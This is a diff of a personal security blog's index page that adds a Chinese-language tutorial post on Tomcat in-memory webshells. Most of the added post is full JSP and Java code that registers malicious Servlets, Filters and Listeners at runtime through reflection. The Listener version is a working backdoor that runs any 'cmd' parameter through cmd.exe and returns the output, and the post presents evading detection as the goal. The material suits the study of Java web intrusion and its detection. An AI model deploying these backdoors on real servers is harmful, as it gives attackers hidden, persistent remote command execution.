@@ -172,6 +172,465 @@
         
 
 <div class="post">
+    <a href="/2024/03/14/TomcatMemShell/">
+        <h2 class="post-title">TomcatMemShell</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/3/14
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="MemShell"><a href="#MemShell" class="headerlink" title="MemShell"></a>MemShell</h1><p>一句话</p>
+<p><code>利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门</code></p>
+<h2 id="基础认知"><a href="#基础认知" class="headerlink" title="基础认知"></a>基础认知</h2><p>内存马又名无文件马，见名知意，指的是无文件落地的webshell</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401211532045.png" alt="图片"></p>
+<h2 id="内存马有什么用"><a href="#内存马有什么用" class="headerlink" title="内存马有什么用"></a>内存马有什么用</h2><p>在不能反弹shell的时候可以用内存马</p>
+<p>规避部分查杀 </p>
+<p>服务器上有防篡改 目录监控 没有写权限</p>
+<p>使用springboot无法解析传统webshell</p>
+<h1 id="传统内存马"><a href="#传统内存马" class="headerlink" title="传统内存马"></a>传统内存马</h1><h2 id="基于Servlet的MemShell"><a href="#基于Servlet的MemShell" class="headerlink" title="基于Servlet的MemShell"></a>基于Servlet的MemShell</h2><p>tomcat在解析完web.xml后在ContextConfig#configureContext方法中注册servlet filter listener</p>
+<p>打断点我们可以看看大概的servlet注册流程</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345700.png" alt="image-20240306134511599"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345087.png" alt="image-20240306134528055"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345077.png" alt="image-20240306134542046"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345357.png" alt="image-20240306134555328"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061422236.png" alt="image-20240306142203198"></p>
+<p>发现并没有进行Servlet的实例化</p>
+<p>因为预加载没有开 要在第一次访问的时候才会实例化</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061347772.png" alt="image-20240306134732713"></p>
+<p>所以后面还需要解决实例化的问题</p>
+<p><code>先写个jsp马 再动态注册</code></p>
+<p>这就是内存马</p>
+<p>我们考虑动态注册的问题</p>
+<p>首先要拿到前文的context对象 (StandardContext)</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061413241.png" alt="image-20240306141321192"></p>
+<p>可以通过requestFacade反射拿到Request对象</p>
+<p>在Request对象的mappingData.context中可以拿到StandardContext对象</p>
+<p>Request的getContext方法就是这么拿的 直接调方法即可</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061415700.png" alt="image-20240306141508625"></p>
+<pre><code class="java">Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+fieldRequest.setAccessible(true);
+Request req = (Request) fieldRequest.get(request);
+StandardContext context = (StandardContext) req.getContext();
+</code></pre>
+<p>拿到context之后只需要把tomcat解析xml时注册servlet做的事情做一遍就行了</p>
+<pre><code class="jsp">&lt;%
+// 动态注册
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = null;
+        try &#123;
+            req = (Request) fieldRequest.get(request);
+        &#125; catch (IllegalAccessException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+        StandardContext context = (StandardContext) req.getContext();
+        Servlet servlet = new MemShell();
+        Wrapper wrapper = context.createWrapper();
+        wrapper.setName(&quot;EvilServlet&quot;);
+        wrapper.setServletClass(servlet.getClass().getSimpleName());
+        wrapper.setServlet(servlet);
+        context.addChild(wrapper);
+        context.addServletMappingDecoded(&quot;/shell&quot;, &quot;EvilServlet&quot;);
+
+
+    &#125; catch (NoSuchFieldException e) &#123;
+        e.printStackTrace();
+    &#125;
+%&gt;
+</code></pre>
+<p>值得注意的是这里额外多调的一个方法</p>
+<p><code>wrapper.setServlet(servlet);</code></p>
+<p>是为了解决实例化的问题的</p>
+<pre><code class="jsp">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+
+&lt;%!
+    public class MemShell extends HttpServlet&#123;
+        @Override
+        public void destroy() &#123;
+            super.destroy();
+        &#125;
+
+        @Override
+        public void init() throws ServletException &#123;
+            super.init();
+        &#125;
+
+        @Override
+        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        &#125;
+    &#125;
+%&gt;
+
+&lt;%
+// 动态注册
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = null;
+        try &#123;
+            req = (Request) fieldRequest.get(request);
+        &#125; catch (IllegalAccessException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+        StandardContext context = (StandardContext) req.getContext();
+        Servlet servlet = new MemShell();
+        Wrapper wrapper = context.createWrapper();
+        wrapper.setName(&quot;EvilServlet&quot;);
+        wrapper.setServletClass(servlet.getClass().getSimpleName());
+        wrapper.setServlet(servlet);
+        context.addChild(wrapper);
+        context.addServletMappingDecoded(&quot;/shell&quot;, &quot;EvilServlet&quot;);
+
+
+    &#125; catch (NoSuchFieldException e) &#123;
+
+        e.printStackTrace();
+    &#125;
+%&gt;
+</code></pre>
+<p>先访问servlet.jsp注册</p>
+<p>然后访问shell触发</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061430763.png" alt="image-20240306143054673"></p>
+<h2 id="基于Filter的MemShell"><a href="#基于Filter的MemShell" class="headerlink" title="基于Filter的MemShell"></a>基于Filter的MemShell</h2><p>先写个常规的filter弹计算器</p>
+<pre><code class="java">package com.arcueid;
+
+import javax.servlet.*;
+import java.io.IOException;
+
+public class FilterTest implements Filter &#123;
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException &#123;
+
+    &#125;
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;
+        chain.doFilter(request,response);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+
+    @Override
+    public void destroy() &#123;
+
+    &#125;
+&#125;
+</code></pre>
+<p>在doFilter上下断点</p>
+<p>跟进doFilter 会进入internalDoFilter</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070721492.png" alt="image-20240307072122381"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070721239.png" alt="image-20240307072158991"></p>
+<p>这里n是filterchain.length</p>
+<p>这一段的意思也就是从filters中一个个取出filterConfig</p>
+<p>我们看看filters变量</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070725671.png" alt="image-20240307072542614"></p>
+<p>有两个 一个是我们自定义的 另一个是tomcat自带的</p>
+<p>在filterConfig中看看</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070726496.png" alt="image-20240307072647432"></p>
+<p>里面配置了filter的类和名字</p>
+<p>然后进行了dofilter</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070728932.png" alt="image-20240307072826873"></p>
+<p>也就是</p>
+<pre><code>filterConfig.getFilter().doFilter()
+</code></pre>
+<p>filterConfig是遍历filters得到的</p>
+<p>而filters存储在ApplicationFilterChain类中</p>
+<p>我们看看ApplicationFilterChain是怎么来的</p>
+<p>在StandardWrapperValve中</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071206280.png" alt="image-20240307120650218"></p>
+<p>在后面调用doFilter进入第一个过滤器</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071207878.png" alt="image-20240307120727826"></p>
+<p>那么这个FilterChain对象是如何获取filert的相关信息的呢？</p>
+<p>在下文并没有对filterChain的属性进行修改 说明在实例化的时候已经获取了相应的值</p>
+<p>跟进ApplicationFilterFactory#createFilterChain</p>
+<pre><code class="java">StandardContext context = (StandardContext)wrapper.getParent();
+            FilterMap[] filterMaps = context.findFilterMaps();
+            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;
+                DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;);
+                String requestPath = null;
+                Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;);
+                if (attribute != null) &#123;
+                    requestPath = attribute.toString();
+                &#125;
+
+                String servletName = wrapper.getName();
+                FilterMap[] var10 = filterMaps;
+                int var11 = filterMaps.length;
+
+                int var12;
+                FilterMap filterMap;
+                ApplicationFilterConfig filterConfig;
+                for(var12 = 0; var12 &lt; var11; ++var12) &#123;
+                    filterMap = var10[var12];
+                    if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;
+                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
+                        if (filterConfig != null) &#123;
+                            filterChain.addFilter(filterConfig);
+                        &#125;
+                    &#125;
+                &#125;
+
+                var10 = filterMaps;
+                var11 = filterMaps.length;
+
+                for(var12 = 0; var12 &lt; var11; ++var12) &#123;
+                    filterMap = var10[var12];
+                    if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;
+                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
+                        if (filterConfig != null) &#123;
+                            filterChain.addFilter(filterConfig);
+                        &#125;
+                    &#125;
+                &#125;
+
+                return filterChain;
+            &#125; else &#123;
+                return filterChain;
+            &#125;
+</code></pre>
+<p>主要是这里</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071213636.png" alt="image-20240307121326305"></p>
+<p>从filterMap中取值 为filter配置filtername 和 patternurl</p>
+<p>我们可以通过addFilterMapBefore方法来添加Filter</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071230184.png" alt="image-20240307123030097"></p>
+<p>先调用了validateFilterMap</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071231926.png" alt="image-20240307123159551"></p>
+<p>这是一个检测合法性的方法</p>
+<p>从这里我们可以知道想要合法 首先要有FilterDef </p>
+<p>所以我们还需要自定义FilterDef 并添加到 FilterDefs</p>
+<p>可以在init处打断点进去看看</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403062229885.png" alt="image-20240306222618007"></p>
+<p>filterDefs是一个hashMap 对应过滤器名称和filterDef对象</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403062237924.png" alt="image-20240306223721885"></p>
+<p>通过遍历从filterDefs中获取key和value，将value封装为ApplicationFilterConfig对象放入filterConfigs变量中。</p>
+<p>实际上存在方法<code>StandardContext#addFilterDef</code></p>
+<p>可以添加进FilterDefs</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071239202.png" alt="image-20240307123901024"></p>
+<p>filterConfigs没有类似的方法 要手动反射去改</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071252848.png" alt="image-20240307125242753"></p>
+<p>于是我们可以写出如下代码</p>
+<pre><code class="jsp">&lt;%
+    String filterName = &quot;EvilFilter&quot;;
+    EvilFilter filter = new EvilFilter();
+
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    filterMap.addURLPattern(&quot;/*&quot;);
+
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(filter);
+    filterDef.setFilterClass(filter.getClass().getSimpleName());
+    filterDef.setFilterName(filterName);
+
+    Constructor&lt;ApplicationFilterConfig&gt; cons = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+    cons.setAccessible(true);
+
+
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = (Request) fieldRequest.get(request);
+        StandardContext context = (StandardContext) req.getContext();
+
+        Field fieldFilterConfigs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+        fieldFilterConfigs.setAccessible(true);
+        Map filterConfigs = (Map)fieldFilterConfigs.get(context);
+
+        context.addFilterDef(filterDef);
+        context.addFilterMapBefore(filterMap);
+        ApplicationFilterConfig filterConfig = cons.newInstance(context, filterDef);
+        filterConfigs.put(filterName,filterConfig);
+    &#125; catch (NoSuchFieldException e) &#123;
+        throw new RuntimeException(e);
+    &#125;
+
+%&gt;
+</code></pre>
+<h2 id="基于Listener的MemShell"><a href="#基于Listener的MemShell" class="headerlink" title="基于Listener的MemShell"></a>基于Listener的MemShell</h2><pre><code class="ini">ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
+ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
+ServletRequestListener：对 Request 请求进行监听（创建、销毁）
+ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
+javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
+javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听
+</code></pre>
+<p>我们在requestInitialized下断点</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401212113217.png" alt="image-20240121211323125"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401221057966.png" alt="image-20240122105551243"></p>
+<p>我们看到listener是在StandardContext#getApplicationEventListeners方法中获得</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401221058804.png" alt="image-20240122105812713"></p>
+<p>因此利用思路也很简单，可以通过StandardContext#addApplicationEventListener方法，add我们自己写的恶意listener</p>
+<p>考虑如下代码</p>
+<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;
+&lt;%@ page import=&quot;java.util.stream.Collectors&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
+
+&lt;%!
+    public class EvilListener implements ServletRequestListener&#123;
+        @Override
+        public void requestDestroyed(ServletRequestEvent sre) &#123;
+            HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            BufferedReader br = null;
+            if (cmd != null) &#123;
+                InputStream in = null;
+                try &#123;
+                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                br = new BufferedReader(new InputStreamReader(in));
+                Field fieldRequest = null;
+                try &#123;
+                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
+                &#125; catch (NoSuchFieldException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                fieldRequest.setAccessible(true);
+                Response response = null;
+                try &#123;
+                    response = ((Request) fieldRequest.get(servletRequest)).getResponse();
+                &#125; catch (IllegalAccessException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                try &#123;
+                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+            &#125;
+        &#125;
+
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) &#123;&#125;
+    &#125;
+
+
+%&gt;
+
+&lt;%
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = (Request) fieldRequest.get(request);
+        StandardContext context = (StandardContext) req.getContext();
+        context.addApplicationEventListener(new EvilListener());
+    &#125; catch (NoSuchFieldException e) &#123;
+        throw new RuntimeException(e);
+    &#125;
+
+%&gt;
+</code></pre>
+<p>分为两块 上面一块就是RCE</p>
+<p>下面一块是添加listener</p>
+<p>先从下面这块开始看</p>
+<pre><code class="jsp">&lt;%
+    try &#123;
+        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
+        fieldRequest.setAccessible(true);
+        Request req = (Request) fieldRequest.get(request);
+        StandardContext context = (StandardContext) req.getContext();
+        context.addApplicationEventListener(new EvilListener());
+    &#125; catch (NoSuchFieldException e) &#123;
+        throw new RuntimeException(e);
+    &#125;
+
+%&gt;
+</code></pre>
+<p>这块的目的就是上面说的 添加listener</p>
+<p>然后看上面的</p>
+<p>由于ServletRequestEvent至提供了ServletRequest，并没有提供Response，因此需要通过反射获取 Response</p>
+<pre><code class="java">&lt;%!
+    public class EvilListener implements ServletRequestListener&#123;
+        @Override
+        public void requestDestroyed(ServletRequestEvent sre) &#123;
+            HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
+            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+            BufferedReader br = null;
+            if (cmd != null) &#123;
+                InputStream in = null;
+                try &#123;
+                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                br = new BufferedReader(new InputStreamReader(in));
+                Field fieldRequest = null;
+                try &#123;
+                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
+                &#125; catch (NoSuchFieldException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                fieldRequest.setAccessible(true);
+                Response response = null;
+                try &#123;
+                    response = ((Request) fieldRequest.get(servletRequest)).getResponse();
+                &#125; catch (IllegalAccessException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+                try &#123;
+                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
+                &#125; catch (IOException e) &#123;
+                    throw new RuntimeException(e);
+                &#125;
+            &#125;
+        &#125;
+
+        @Override
+        public void requestInitialized(ServletRequestEvent sre) &#123;&#125;
+    &#125;
+
+
+%&gt;
+</code></pre>
+<p>另一种getContext的方法</p>
+<pre><code class="java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+</code></pre>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ffa2c4">java</a>
+        </span>
+        
+    </div>
+    <a href="/2024/03/14/TomcatMemShell/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/03/03/CommonsCollections5-6/">
         <h2 class="post-title">CommonsCollections5 6</h2>
     </a>
@@ -546,7 +1005,7 @@ public class CC6 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00a596">java</a>
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
         </span>
         
     </div>
@@ -839,7 +1298,7 @@ public class CC4 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #ffa2c4">java</a>
         </span>
         
     </div>
@@ -1018,7 +1477,7 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
@@ -1426,7 +1885,7 @@ public class CC1LazyVersion &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #03a9f4">java</a>
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
         </span>
         
     </div>
